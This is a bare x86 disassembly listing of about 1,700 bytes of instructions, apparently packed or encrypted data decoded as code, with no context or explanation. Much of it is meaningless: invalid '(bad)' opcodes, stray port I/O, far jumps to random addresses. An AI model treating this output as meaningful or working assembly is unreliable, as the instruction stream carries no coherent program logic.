  41f547:	xor    edi,eax
  41f549:	add    edi,ecx
  41f54b:	jmp    0x41fa5d
  41f550:	cmp    al,0xd0
  41f552:	les    edi,FWORD PTR ds:0xd9c9d1d4
  41f558:	jmp    0xf4e7cea0
  41f55d:	push   esp
  41f55e:	ret    0x3ca6
  41f561:	dec    eax
  41f562:	jg     0x41f5dc
  41f564:	jae    0x41f5e2
  41f566:	js     0x41f5e0
  41f568:	addr16 dec edi
  41f56a:	mov    ah,0xee
  41f56c:	das    
  41f56d:	sub    BYTE PTR [ebx-0x3d],ch
  41f570:	je     0x41f5bc
  41f572:	or     bh,BYTE PTR [edi+0x5a7a2770]
  41f578:	nop
  41f579:	mov    esp,0xfc171f98
  41f57e:	xor    cl,BYTE PTR [ecx]
  41f580:	call   0x24072dcb
  41f585:	mov    dl,0x1c
  41f587:	adc    eax,0x4a25469d
  41f58c:	sbb    ah,bl
  41f58e:	call   0xf1b0b5ef
  41f593:	dec    ebp
  41f594:	mov    ecx,DWORD PTR [edx]
  41f596:	push   0x311ee769
  41f59b:	out    0xb7,eax
  41f59d:	sub    eax,0xad5688e5
  41f5a2:	xchg   DWORD PTR [edi],edi
  41f5a4:	dec    esi
  41f5a5:	xchg   DWORD PTR [ecx+ebp*4+0x793a16bf],esp
  41f5ac:	out    0x25,eax
  41f5ae:	xor    dl,BYTE PTR [ebp+eax*4-0x6420cdb8]
  41f5b5:	sub    DWORD PTR [ebx+0xe4aa0da],0x742948e0
  41f5bf:	jle    0x41f5eb
  41f5c1:	les    ebx,FWORD PTR [ebx+0x6c]
  41f5c4:	sbb    cl,BYTE PTR [edx+0xc58397c]
  41f5ca:	push   ss
  41f5cb:	push   ecx
  41f5cc:	xchg   ebx,eax
  41f5cd:	jge    0x41f577
  41f5cf:	outs   dx,DWORD PTR ds:[esi]
  41f5d0:	fidivr DWORD PTR [ecx-0x72355777]
  41f5d6:	and    al,0x5f
  41f5d8:	into   
  41f5d9:	jo     0x41f5a9
  41f5db:	push   DWORD PTR [ebx+edi*1]
  41f5de:	ja     0x41f657
  41f5e0:	sbb    ebp,DWORD PTR ds:0xe17e6fa1
  41f5e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5e7:	cmp    ah,BYTE PTR [esi+0x37]
  41f5ea:	push   edx
  41f5eb:	in     eax,dx
  41f5ec:	shl    DWORD PTR [edx],0xe6
  41f5ef:	repnz nop
  41f5f1:	sbb    bl,bh
  41f5f3:	sbb    eax,0xe188082f
  41f5f8:	push   edx
  41f5f9:	pop    edi
  41f5fa:	cmp    eax,0x5550c338
  41f5ff:	jge    0x41f5d7
  41f601:	mov    esp,DWORD PTR [eax*1+0xb98918a]
  41f608:	out    dx,al
  41f609:	xor    dh,BYTE PTR [esi+0x4]
  41f60c:	pop    edx
  41f60d:	jo     0x41f5ce
  41f60f:	mov    cl,0xed
  41f611:	cdq    
  41f612:	mov    dh,BYTE PTR [edx-0x1723f197]
  41f618:	xchg   DWORD PTR [ecx+0x776babf4],eax
  41f61e:	ror    bl,1
  41f620:	fnstsw WORD PTR [ebx+0x1c]
  41f623:	inc    esi
  41f624:	adc    edi,DWORD PTR [edi]
  41f626:	fsub   QWORD PTR [edx-0x4e]
  41f629:	ret    0x596c
  41f62c:	cmp    BYTE PTR [ecx+ebx*2-0x3f5bd0e1],dh
  41f633:	aas    
  41f634:	push   0x25
  41f636:	add    DWORD PTR [esi],edx
  41f638:	push   ss
  41f639:	mov    ah,0x66
  41f63b:	cmp    DWORD PTR [esi-0x44],ecx
  41f63e:	cmp    al,0x56
  41f640:	dec    edx
  41f641:	sbb    al,0x8f
  41f643:	repnz push esp
  41f645:	xchg   al,al
  41f647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f648:	in     eax,dx
  41f649:	mov    edi,0x39f916bf
  41f64e:	repz dec esi
  41f650:	call   0x86ad5291
  41f655:	stc    
  41f656:	jb     0x41f6a7
  41f658:	sub    ebp,DWORD PTR [ebp+0x29e35776]
  41f65e:	daa    
  41f65f:	push   eax
  41f660:	and    esi,edx
  41f662:	and    bh,BYTE PTR [edi-0x2148dc81]
  41f668:	aas    
  41f669:	sbb    al,0xc2
  41f66b:	push   esp
  41f66c:	sub    cl,bh
  41f66e:	mov    ebx,0x122b52b2
  41f673:	mov    al,BYTE PTR [esp+esi*1+0x10439d7e]
  41f67a:	jp     0x41f61b
  41f67c:	mov    bl,0x44
  41f67e:	sahf   
  41f67f:	jae    0x41f611
  41f681:	push   edx
  41f682:	test   ecx,ecx
  41f684:	test   eax,0x93475c15
  41f689:	int    0x1d
  41f68b:	add    al,0x77
  41f68d:	call   0xdf10:0xf421
  41f693:	xor    BYTE PTR [edx],ch
  41f695:	(bad)  
  41f696:	idiv   DWORD PTR [ecx]
  41f698:	sbb    eax,0x5cb20e15
  41f69d:	inc    edi
  41f69e:	pushf  
  41f69f:	jb     0x41f62f
  41f6a1:	add    al,0x22
  41f6a3:	xchg   edx,eax
  41f6a4:	enter  0x49c4,0x2e
  41f6a8:	iret   
  41f6a9:	xor    eax,0xb774a2d0
  41f6ae:	test   al,0x1a
  41f6b0:	aas    
  41f6b1:	jle    0x41f677
  41f6b3:	cli    
  41f6b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6b5:	arpl   WORD PTR [ebp+eiz*2-0x795d28d8],ax
  41f6bc:	in     al,dx
  41f6bd:	rcl    eax,1
  41f6bf:	sbb    al,0x12
  41f6c1:	mov    edx,0x65dafc0a
  41f6c6:	pusha  
  41f6c7:	jbe    0x41f6b9
  41f6c9:	jmp    0x41f744
  41f6cb:	punpckhwd mm4,QWORD PTR [esp+esi*2]
  41f6cf:	outs   dx,DWORD PTR ds:[esi]
  41f6d0:	cmp    eax,0xd04bfad8
  41f6d5:	(bad)  
  41f6d6:	pop    ecx
  41f6d7:	out    0x5,eax
  41f6d9:	cmc    
  41f6da:	xor    al,0xef
  41f6dc:	xor    esp,ebp
  41f6de:	add    BYTE PTR [eax+0x78],al
  41f6e1:	ficomp DWORD PTR [ebx-0x65]
  41f6e4:	jne    0x41f740
  41f6e6:	jne    0x41f748
  41f6e8:	push   esp
  41f6e9:	sbb    DWORD PTR [ebx-0x56],ebx
  41f6ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6ed:	(bad)  
  41f6ee:	mov    al,ds:0x389c4f3a
  41f6f3:	mov    eax,ds:0x23dd32b9
  41f6f8:	jns    0x41f6ea
  41f6fa:	push   ecx
  41f6fb:	mov    cl,0xf3
  41f6fd:	js     0x41f6ce
  41f6ff:	pop    ebp
  41f700:	or     DWORD PTR [esi+0x7e],edi
  41f703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f704:	repz xchg ebp,eax
  41f706:	test   BYTE PTR [edi+0x68],dl
  41f709:	push   ebx
  41f70a:	jmp    0xf31259ed
  41f70f:	retf   0xeb4b
  41f712:	imul   esp,DWORD PTR [esi+0x6],0xffffffe9
  41f716:	bnd ja 0x41f726
  41f719:	mov    dh,0x68
  41f71b:	sub    eax,0x29ea0d1c
  41f720:	lods   al,BYTE PTR ds:[esi]
  41f721:	out    dx,al
  41f722:	nop
  41f723:	sub    eax,0x4220690e
  41f728:	push   0xffffffa9
  41f72a:	pop    ecx
  41f72b:	out    dx,eax
  41f72c:	std    
  41f72d:	sbb    WORD PTR [ebp-0x1d8c61c4],si
  41f734:	popf   
  41f735:	pop    es
  41f736:	push   es
  41f737:	xor    BYTE PTR [ecx-0x1],0x61
  41f73b:	fwait
  41f73c:	sbb    DWORD PTR [ecx-0x68],ebp
  41f73f:	push   es
  41f740:	fwait
  41f741:	pop    es
  41f742:	xchg   ebp,eax
  41f743:	imul   esi,DWORD PTR [edx+0x364bad7],0xf7fb37d6
  41f74d:	mov    dh,0x33
  41f74f:	ins    BYTE PTR es:[edi],dx
  41f750:	mov    ebp,0xdba730fb
  41f755:	out    0xd1,al
  41f757:	jg     0x41f7cd
  41f759:	stc    
  41f75a:	loope  0x41f794
  41f75c:	xor    ch,BYTE PTR [edx-0x2c]
  41f75f:	mov    ?,WORD PTR [edx-0xe]
  41f762:	aam    0xed
  41f764:	push   edi
  41f765:	or     DWORD PTR [edi],eax
  41f767:	or     ch,ah
  41f769:	adc    ah,0xa3
  41f76c:	pushf  
  41f76d:	ror    BYTE PTR [esi+0xaa427cc],cl
  41f773:	clc    
  41f774:	or     al,0x52
  41f776:	cmpxchg dl,bh
  41f779:	adc    bh,BYTE PTR [eax]
  41f77b:	clc    
  41f77c:	int3   
  41f77d:	in     al,0x4c
  41f77f:	and    al,0x27
  41f781:	adc    eax,0x41f01a26
  41f786:	inc    esp
  41f787:	fisubr DWORD PTR [eax+0x1934c8e4]
  41f78d:	mov    ebp,0xd5e34c1e
  41f792:	sub    BYTE PTR [ebp+0x751cfa59],cl
  41f798:	loopne 0x41f819
  41f79a:	and    eax,0x783684f6
  41f79f:	inc    esp
  41f7a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7a1:	imul   BYTE PTR [esi]
  41f7a3:	das    
  41f7a4:	mov    dl,0x51
  41f7a6:	mov    al,ds:0xc5dfe305
  41f7ab:	and    al,0x25
  41f7ad:	mov    ds:0x62082822,eax
  41f7b2:	push   0x7a
  41f7b4:	cmp    al,0xff
  41f7b6:	mov    al,0x9f
  41f7b8:	je     0x41f81f
  41f7ba:	xchg   edx,eax
  41f7bb:	xlat   BYTE PTR ds:[ebx]
  41f7bc:	test   DWORD PTR [edi+eax*2],ebx
  41f7bf:	mov    ds:0x2b756180,eax
  41f7c4:	loopne 0x41f79c
  41f7c6:	mov    ch,BYTE PTR [eax-0x7bc28ed9]
  41f7cc:	mov    dl,0x59
  41f7ce:	xor    al,0x2e
  41f7d0:	ins    DWORD PTR es:[edi],dx
  41f7d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7d2:	retf   
  41f7d3:	push   0x73
  41f7d5:	jne    0x41f7a1
  41f7d7:	mov    eax,ds:0xe488bf99
  41f7dc:	mov    cl,0x38
  41f7de:	ror    BYTE PTR [edx],cl
  41f7e0:	cmp    al,0x58
  41f7e2:	push   edi
  41f7e3:	jl     0x41f7f6
  41f7e5:	lods   eax,DWORD PTR ds:[esi]
  41f7e6:	retf   0x3337
  41f7e9:	push   eax
  41f7ea:	out    dx,al
  41f7eb:	fstp   DWORD PTR [ecx-0x7d4a9c4d]
  41f7f1:	aad    0xcf
  41f7f3:	(bad)  
  41f7f4:	or     eax,0xfefa5494
  41f7f9:	rol    BYTE PTR [edi+eax*4+0x58c98265],0x1
  41f801:	pop    eax
  41f802:	je     0x41f87f
  41f804:	or     DWORD PTR ds:0xa52e797f,esp
  41f80a:	add    dl,BYTE PTR [ebx-0x7c]
  41f80d:	inc    ebp
  41f80e:	push   0x7
  41f810:	clc    
  41f811:	pop    eax
  41f812:	sti    
  41f813:	gs out dx,eax
  41f815:	sahf   
  41f816:	ror    BYTE PTR [edx+0x7597353e],1
  41f81c:	scas   al,BYTE PTR es:[edi]
  41f81d:	push   ss
  41f81e:	inc    edx
  41f81f:	scas   eax,DWORD PTR es:[edi]
  41f820:	pop    ss
  41f821:	das    
  41f822:	jnp    0x41f7a4
  41f824:	sti    
  41f825:	cs cwde 
  41f827:	fst    QWORD PTR [edx+eax*8-0x7c]
  41f82b:	push   0xffffffd0
  41f82d:	jl     0x41f88d
  41f82f:	retf   
  41f830:	aaa    
  41f831:	test   eax,0xccdce811
  41f836:	push   edi
  41f837:	mov    eax,0x230e3890
  41f83c:	dec    esi
  41f83d:	fucomp st(4)
  41f83f:	addr16 mov cl,0xec
  41f842:	ret    
  41f843:	sub    al,0x2c
  41f845:	loopne 0x41f856
  41f847:	adc    eax,0xf496576a
  41f84c:	cwde   
  41f84d:	sbb    BYTE PTR [esi+0x69],0x8e
  41f851:	test   DWORD PTR [ebx],ebp
  41f853:	adc    DWORD PTR ds:0x4833b9c2,ecx
  41f859:	stos   DWORD PTR es:[edi],eax
  41f85a:	out    dx,al
  41f85b:	cmp    edx,DWORD PTR [ebx]
  41f85d:	or     cl,BYTE PTR [ebp-0x68]
  41f860:	xchg   esp,eax
  41f861:	mov    edi,0xa539f686
  41f866:	js     0x41f88f
  41f868:	cmp    BYTE PTR [eax+ebx*8+0x8f84fa5],dh
  41f86f:	add    BYTE PTR [ecx-0x36aca5a2],ah
  41f875:	cmp    ah,BYTE PTR ds:0x3051eaef
  41f87b:	shl    al,cl
  41f87d:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41f87f:	stos   BYTE PTR es:[edi],al
  41f880:	mov    cl,0x28
  41f882:	pop    edx
  41f883:	xchg   ebp,eax
  41f884:	cmp    esi,DWORD PTR [edx-0x7]
  41f887:	stos   BYTE PTR es:[edi],al
  41f888:	es jne 0x41f8ea
  41f88b:	and    eax,0x8dca96bc
  41f890:	mov    ebx,0xe3f41282
  41f895:	add    al,0x23
  41f897:	mov    al,ds:0x8fbd8854
  41f89c:	jp     0x41f8c8
  41f89e:	in     al,0x3c
  41f8a0:	xor    ebx,DWORD PTR [esi+edx*1-0x6dd0e40]
  41f8a7:	sub    al,0x58
  41f8a9:	mov    WORD PTR [ecx-0x39],?
  41f8ac:	pop    ss
  41f8ad:	cmp    al,0x87
  41f8af:	mov    ecx,0xc2e7c316
  41f8b4:	jbe    0x41f924
  41f8b6:	idiv   eax
  41f8b8:	and    eax,0x48fb1013
  41f8bd:	push   esi
  41f8be:	es mov eax,0x919ba496
  41f8c4:	adc    BYTE PTR [esp+esi*2],ch
  41f8c7:	xchg   edi,eax
  41f8c8:	or     ecx,esi
  41f8ca:	loope  0x41f93a
  41f8cc:	shl    edx,0xf2
  41f8cf:	daa    
  41f8d0:	sub    edi,ebp
  41f8d2:	(bad)  
  41f8d3:	into   
  41f8d4:	(bad)
  41f8d7:	imul   edx,DWORD PTR [edx-0x48],0x7d9d2d
  41f8de:	sbb    esp,DWORD PTR [edx]
  41f8e0:	cmc    
  41f8e1:	or     eax,0xd2c700fa
  41f8e6:	aas    
  41f8e7:	push   ecx
  41f8e8:	(bad)  
  41f8e9:	out    0xd4,al
  41f8eb:	ins    BYTE PTR es:[edi],dx
  41f8ec:	jbe    0x41f8b4
  41f8ee:	js     0x41f8e3
  41f8f0:	dec    eax
  41f8f1:	(bad)  
  41f8f2:	(bad)  [bx+si-0x31]
  41f8f6:	adc    BYTE PTR [ecx],ah
  41f8f8:	test   al,0xb9
  41f8fa:	stos   BYTE PTR es:[edi],al
  41f8fb:	xchg   ebx,eax
  41f8fc:	mov    BYTE PTR [ebx],cl
  41f8fe:	jmp    0xe0c8:0xfa97858a
  41f905:	and    DWORD PTR [ebp-0x52],edi
  41f908:	sub    al,0x8
  41f90a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f90b:	jge    0x41f930
  41f90d:	dec    edx
  41f90e:	daa    
  41f90f:	sub    ah,bl
  41f911:	push   es
  41f912:	xchg   ebp,eax
  41f913:	mov    esp,DWORD PTR [eax-0x73]
  41f916:	mov    al,0x80
  41f918:	mov    al,0xf4
  41f91a:	dec    eax
  41f91b:	push   edx
  41f91c:	lds    ebp,FWORD PTR [edi]
  41f91e:	call   0x1e2d:0xab258baf
  41f925:	rcl    DWORD PTR [edx+0x55],0xd0
  41f929:	rol    BYTE PTR [ecx+0x4b0966c5],1
  41f92f:	mov    DWORD PTR [ecx],ebp
  41f931:	es push ds
  41f933:	add    edx,DWORD PTR [esi-0x70]
  41f936:	fcomp  DWORD PTR [ecx+0x52]
  41f939:	or     al,0x53
  41f93b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f93c:	mov    dh,0x45
  41f93e:	adc    BYTE PTR [eax-0x37c97be0],dl
  41f944:	ss (bad) 
  41f946:	adc    ch,BYTE PTR [esi-0x685aa05a]
  41f94c:	pop    eax
  41f94d:	jp     0x41f959
  41f94f:	shl    DWORD PTR [esi+0x5a],0x2f
  41f953:	mov    eax,ds:0xef14e811
  41f958:	rcl    edx,1
  41f95a:	xor    DWORD PTR [eax-0x4a5755bd],ebp
  41f960:	fcomp  QWORD PTR es:[eax-0x1401a9f9]
  41f967:	(bad)  
  41f968:	push   0xffffff9b
  41f96a:	sub    al,0x19
  41f96c:	cmp    eax,0x84c5b6a
  41f971:	cmp    BYTE PTR [esi+0x2e],0x11
  41f975:	arpl   WORD PTR [edi+0x3d],cx
  41f978:	inc    eax
  41f979:	nop
  41f97a:	pop    ecx
  41f97b:	fidiv  DWORD PTR [edi+ebp*4-0x5b]
  41f97f:	mov    WORD PTR [edi],es
  41f981:	pushf  
  41f982:	and    al,BYTE PTR [ebp+0x183f6c9]
  41f988:	xchg   ebp,eax
  41f989:	inc    ebp
  41f98a:	jle    0x41f9f1
  41f98c:	xlat   BYTE PTR ds:[ebx]
  41f98d:	les    ebx,FWORD PTR [esi]
  41f98f:	jae    0x41f975
  41f991:	adc    ah,BYTE PTR [edi+0x4b0c817a]
  41f997:	adc    bl,0x77
  41f99a:	pop    eax
  41f99b:	mov    esp,DWORD PTR [eax]
  41f99d:	jl     0x41f940
  41f99f:	jb     0x41f93d
  41f9a1:	pop    ecx
  41f9a2:	iret   
  41f9a3:	adc    edx,eax
  41f9a5:	sub    eax,0x6294d609
  41f9aa:	dec    ebx
  41f9ab:	std    
  41f9ac:	inc    DWORD PTR [esi+0x23]
  41f9af:	int    0xd2
  41f9b1:	mov    eax,0x51a89b9f
  41f9b7:	cmp    al,0xd2
  41f9b9:	out    dx,al
  41f9ba:	sbb    eax,0x4f9c9b26
  41f9bf:	cmp    al,0x40
  41f9c1:	in     al,0x7
  41f9c3:	es aad 0x81
  41f9c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9c7:	jno    0x41f95f
  41f9c9:	mov    ebx,ebp
  41f9cb:	in     eax,dx
  41f9cc:	jle    0x41f990
  41f9ce:	sbb    bl,cl
  41f9d0:	dec    ebp
  41f9d1:	repz dec ecx
  41f9d3:	ins    DWORD PTR es:[edi],dx
  41f9d4:	mov    edi,0xa36bd98c
  41f9d9:	or     al,0x97
  41f9db:	pop    ss
  41f9dc:	bound  esp,QWORD PTR [ecx-0x39cc3320]
  41f9e2:	int    0x14
  41f9e4:	add    edi,DWORD PTR [eax+0x11]
  41f9e7:	inc    edi
  41f9e8:	into   
  41f9e9:	mov    eax,DWORD PTR [ecx+ebp*4+0x6f]
  41f9ed:	add    al,0x1d
  41f9ef:	pop    eax
  41f9f0:	inc    esp
  41f9f1:	push   ebx
  41f9f2:	ins    BYTE PTR es:[edi],dx
  41f9f3:	dec    edx
  41f9f4:	pushf  
  41f9f5:	add    BYTE PTR [eax+0x10],ch
  41f9f8:	sar    esi,1
  41f9fa:	sti    
  41f9fb:	inc    ecx
  41f9fc:	pop    ebx
  41f9fd:	mov    al,0x3b
  41f9ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa00:	ret    
  41fa01:	out    0x98,eax
  41fa03:	not    dl
  41fa05:	xchg   DWORD PTR [ebp+0x3d2dcd70],ecx
  41fa0b:	std    
  41fa0c:	and    ch,BYTE PTR [ecx]
  41fa0e:	lock dec edi
  41fa10:	jo     0x41f9d9
  41fa12:	mov    BYTE PTR [ebx+0x1d],0x48
  41fa16:	jg     0x41f9b7
  41fa18:	mov    edi,0xc4547013
  41fa1d:	xor    edi,DWORD PTR [eax+0x4ceee678]
  41fa23:	sub    ch,0xb0
  41fa26:	xchg   ecx,eax
  41fa27:	stc    
  41fa28:	jb     0x41f9cc
  41fa2a:	and    al,0x46
  41fa2c:	and    al,0xd8
  41fa2e:	in     al,0xbb
  41fa30:	fwait
  41fa31:	pop    ss
  41fa32:	repz int 0x3c
  41fa35:	scas   al,BYTE PTR es:[edi]
  41fa36:	pop    esi
  41fa37:	aaa    
  41fa38:	sub    DWORD PTR [edx-0x19],ecx
  41fa3b:	pusha  
  41fa3c:	nop
  41fa3d:	inc    ebp
  41fa3e:	icebp  
  41fa3f:	dec    edi
  41fa40:	js     0x41fab0
  41fa42:	dec    esp
  41fa43:	pop    esp
  41fa44:	or     esp,ecx
  41fa46:	out    dx,eax
  41fa47:	pop    es
  41fa48:	mov    eax,ds:0xca704526
  41fa4d:	stc    
  41fa4e:	add    eax,0xdeeecdd
  41fa53:	xor    ch,BYTE PTR [edx+0x5f]
  41fa56:	push   0x2c
  41fa58:	xchg   esi,eax
  41fa59:	(bad)  
  41fa5a:	loopne 0x41faa6
  41fa5c:	das    
  41fa5d:	add    edx,ecx
  41fa5f:	jmp    0x41ff71
  41fa64:	xlat   BYTE PTR ds:[ebx]
  41fa65:	int    0xc4
  41fa67:	ror    edx,1
  41fa69:	(bad)  
  41fa6b:	fstp   DWORD PTR [ebp-0x48552b94]
  41fa71:	and    ebp,esp
  41fa73:	cmp    esi,DWORD PTR [edi]
  41fa75:	push   ebx
  41fa76:	jg     0x41faf0
  41fa78:	jae    0x41faf6
  41fa7a:	js     0x41faf4
  41fa7c:	xlat   BYTE PTR ds:[ebx]
  41fa7d:	jae    0x41fa57
  41fa7f:	adc    BYTE PTR [ecx],0xee
  41fa82:	sahf   
  41fa83:	outs   dx,BYTE PTR ds:[esi]
  41fa84:	pop    ss
  41fa85:	push   0xf
  41fa87:	retf   
  41fa88:	js     0x41fa9b
  41fa8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa8b:	xchg   esp,eax
  41fa8c:	fwait
  41fa8d:	dec    edi
  41fa8e:	adc    BYTE PTR [edx],dh
  41fa90:	pop    ss
  41fa91:	sub    al,0xdd
  41fa93:	ja     0x41fab7
  41fa95:	sti    
  41fa96:	into   
  41fa97:	add    BYTE PTR [ecx-0x1caf5cd8],dl
  41fa9d:	jge    0x41fafb
  41fa9f:	or     al,BYTE PTR [eax+0x537e6cbc]
  41faa5:	mov    ds:0x271e3ed2,al
  41faaa:	pop    esp
  41faab:	add    esp,0xfffffff1
  41faae:	pop    es
  41faaf:	das    
  41fab0:	fs and esp,edi
  41fab3:	mov    edx,0xf4ec50e1
  41fab8:	jbe    0x41fb1c
  41faba:	xchg   ebp,eax
  41fabb:	jmp    0x41fb32
  41fabd:	sub    dh,BYTE PTR [edx]
  41fabf:	inc    ebx
  41fac0:	cli    
  41fac1:	aas    
  41fac2:	frstor [ebx+0x13782e7b]
  41fac8:	inc    edi
  41fac9:	out    dx,eax
  41faca:	lods   eax,DWORD PTR ds:[esi]
  41facb:	fild   QWORD PTR ds:0x201f3c2c
  41fad1:	daa    
  41fad2:	jne    0x41fb1f
  41fad4:	mov    eax,0x47f96c02
  41fad9:	ins    DWORD PTR es:[edi],dx
  41fada:	daa    
  41fadb:	mov    eax,0x518a4b18
  41fae0:	(bad)  
  41fae1:	mov    ebp,0xdc1bfc5d
  41fae6:	inc    esp
  41fae7:	jno    0x41faf1
  41fae9:	arpl   WORD PTR [ecx],di
  41faeb:	js     0x41fb35
  41faed:	adc    al,0x6d
  41faef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faf0:	cmp    al,0xa9
  41faf2:	outs   dx,DWORD PTR ds:[esi]
  41faf3:	int3   
  41faf4:	jno    0x41fadf
  41faf6:	in     eax,dx
  41faf7:	mov    edx,0x7362682a
  41fafc:	dec    edi
  41fafd:	cwde   
  41fafe:	pop    esi
  41faff:	pusha  
  41fb00:	or     BYTE PTR ss:[ebp-0x52e449b7],dl
  41fb07:	sub    DWORD PTR [edx],0x49
  41fb0a:	arpl   WORD PTR [eax+0x5d547a7e],sp
  41fb10:	jg     0x41fae6
  41fb12:	jge    0x41fb2a
  41fb14:	pop    ecx
  41fb15:	and    ecx,DWORD PTR [eax]
  41fb17:	pusha  
  41fb18:	cli    
  41fb19:	jp     0x41faac
  41fb1b:	dec    ebx
  41fb1c:	adc    al,0xbf
  41fb1e:	xor    DWORD PTR [ecx],edi
  41fb20:	rcr    dl,cl
  41fb22:	inc    esi
  41fb23:	sub    DWORD PTR [ecx-0x7ae8d85a],ebx
  41fb29:	jp     0x41fb4b
  41fb2b:	cmp    eax,0x3481d85a
  41fb30:	xor    al,0xf8
  41fb32:	mov    bh,0xfb
  41fb34:	into   
  41fb35:	mov    BYTE PTR [ecx-0x48],ah
  41fb38:	cmp    bl,BYTE PTR [ebx-0x54]
  41fb3b:	pop    esp
  41fb3c:	(bad)  
  41fb3d:	int    0x19
  41fb3f:	mov    WORD PTR [ebp+ecx*4-0x7],?
  41fb43:	loope  0x41fb79
  41fb45:	xor    BYTE PTR [eax],ah
  41fb47:	push   edi
  41fb48:	shl    DWORD PTR [edi+0x168522c1],0x46
  41fb4f:	mov    ebx,0x131ab220
  41fb54:	fs mov bl,0x3d
  41fb57:	(bad)  
  41fb58:	mov    al,ds:0x552788c3
  41fb5d:	push   esp
  41fb5e:	scas   eax,DWORD PTR es:[edi]
  41fb5f:	icebp  
  41fb60:	push   edx
  41fb61:	xor    ecx,esi
  41fb63:	loop   0x41fbac
  41fb65:	pusha  
  41fb66:	jg     0x41fb23
  41fb68:	aaa    
  41fb69:	xchg   BYTE PTR [esi-0x7c],bh
  41fb6c:	test   BYTE PTR [edx*8-0x6c6b1eb0],cl
  41fb73:	mov    bh,0x82
  41fb75:	xchg   esp,eax
  41fb76:	adc    eax,ecx
  41fb78:	pop    eax
  41fb79:	push   edi
  41fb7a:	and    DWORD PTR [edx+0x76a33748],edx
  41fb80:	and    esi,ebp
  41fb82:	add    DWORD PTR [ecx-0x75],edi
  41fb85:	mov    cl,dh
  41fb87:	bound  esp,QWORD PTR [eax]
  41fb89:	out    0x5c,al
  41fb8b:	inc    edx
  41fb8c:	pop    ebp
  41fb8d:	loopne 0x41fb48
  41fb8f:	out    dx,al
  41fb90:	xchg   cx,ax
  41fb92:	jns    0x41fbc7
  41fb94:	add    edi,ecx
  41fb96:	or     BYTE PTR [edi+ecx*8],bl
  41fb99:	push   0x43766dc8
  41fb9e:	xor    cl,BYTE PTR [esi+0x23]
  41fba1:	ins    BYTE PTR es:[edi],dx
  41fba2:	js     0x41fbc5
  41fba4:	sub    eax,0x91e45de1
  41fba9:	scas   al,BYTE PTR es:[edi]
  41fbaa:	out    0xeb,al
  41fbac:	loope  0x41fbe7
  41fbae:	stos   DWORD PTR es:[edi],eax
  41fbaf:	fild   QWORD PTR [eax-0x55]
  41fbb2:	xor    dh,ah
  41fbb4:	and    BYTE PTR [edx-0xc],dh
  41fbb7:	and    eax,0x6898b6fe
  41fbbc:	mov    ebx,0x6d2b22e3
  41fbc1:	sbb    BYTE PTR [edi+0x3e],cl
  41fbc4:	(bad)  [ebx+eiz*2-0x4a0d4f95]
  41fbcb:	test   ebx,eax
  41fbcd:	mov    bl,0xe1
  41fbcf:	hlt    
  41fbd0:	out    0x2c,al
  41fbd2:	add    DWORD PTR [esi],edi
  41fbd4:	mov    al,0x6c
  41fbd6:	cld    
  41fbd7:	lods   eax,DWORD PTR ds:[esi]
  41fbd8:	adc    eax,0x4a6b4fbe
  41fbdd:	pop    edi
  41fbde:	inc    eax
  41fbdf:	dec    ebx
  41fbe0:	loop   0x41fbfc
  41fbe2:	jno    0x41fbbe
  41fbe4:	jp     0x41fbe0
  41fbe6:	sbb    ah,bl
  41fbe8:	mov    bl,0xc5
  41fbea:	loopne 0x41fc24
  41fbec:	cmp    cl,0xdd
  41fbef:	jecxz  0x41fc2b
  41fbf1:	xchg   edi,eax
  41fbf2:	lds    esi,FWORD PTR [ecx+0x3ed7f580]
  41fbf8:	imul   edx,DWORD PTR [edx-0xd],0x45788a7e
  41fbff:	dec    eax
  41fc00:	pop    ecx
  41fc01:	das    
  41fc02:	mov    eax,0x905a24bb
  41fc07:	imul   eax,DWORD PTR [edi],0x8f797e5a
  41fc0d:	sbb    eax,0xbd54b43d
  41fc12:	mov    dl,0xfe
  41fc14:	(bad)
  41fc18:	scas   eax,DWORD PTR es:[edi]
  41fc19:	scas   al,BYTE PTR es:[edi]
  41fc1a:	xchg   esp,eax
  41fc1b:	mov    ah,0x9
  41fc1d:	pop    ebx
  41fc1e:	ret    
  41fc1f:	push   esi
  41fc20:	mov    WORD PTR [ebp-0x35],cs
  41fc23:	(bad)  
  41fc24:	dec    edx
  41fc25:	push   edx
  41fc26:	sub    esi,edx
  41fc28:	inc    esi
  41fc29:	cli    
  41fc2a:	aad    0xd1
  41fc2c:	stos   DWORD PTR es:[edi],eax
  41fc2d:	jge    0x41fbfe
  41fc2f:	jmp    0x41fc90
  41fc31:	mov    DWORD PTR ds:0xf03b4367,ebp
  41fc37:	mov    ebp,0x5b20d9b2
  41fc3c:	jg     0x41fc9e
  41fc3e:	enter  0x94b6,0x80
  41fc42:	xor    cl,BYTE PTR [ecx]
  41fc44:	test   DWORD PTR [ecx-0x7e7cef24],0x6126b6ca
  41fc4e:	std    
  41fc4f:	imul   ebp,ecx,0xffffffa6
  41fc52:	or     dl,bh
  41fc54:	jae    0x41fcd0
  41fc56:	mov    dh,al
  41fc58:	dec    ebx
  41fc59:	pop    ebx
  41fc5a:	in     al,dx
  41fc5b:	pop    ss
  41fc5c:	in     eax,dx
  41fc5d:	fld    TBYTE PTR [edx+0x3677de6]
  41fc63:	mov    cl,0x41
  41fc65:	pusha  
  41fc66:	or     DWORD PTR [esi+edi*2+0x6e2d372],edx
  41fc6d:	xchg   esi,eax
  41fc6e:	int3   
  41fc6f:	adc    BYTE PTR [eax-0x7fdbc0c0],ah
  41fc75:	out    dx,eax
  41fc76:	cdq    
  41fc77:	call   0x99a5:0xa34467bc
  41fc7e:	sub    eax,DWORD PTR [edx-0x2a]
  41fc81:	in     eax,0xee
  41fc83:	inc    edx
  41fc84:	mov    edx,edi
  41fc86:	jo     0x41fc4b
